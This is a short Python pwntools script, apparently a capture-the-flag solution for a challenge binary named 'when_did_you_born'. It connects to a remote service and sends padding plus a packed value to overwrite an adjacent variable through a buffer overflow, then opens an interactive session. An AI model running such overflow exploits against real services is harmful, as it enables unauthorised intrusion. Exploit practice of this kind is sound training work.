from pwn import *

# p = process("./when_did_you_born")
p = remote("111.198.29.45" , 30875)
elf = ELF("./when_did_you_born")

birth = 0x786
p.sendlineafter("?\n" , "1")
p.sendlineafter("?\n" , "a" * 8 + p64(0x786))
p.interactive()
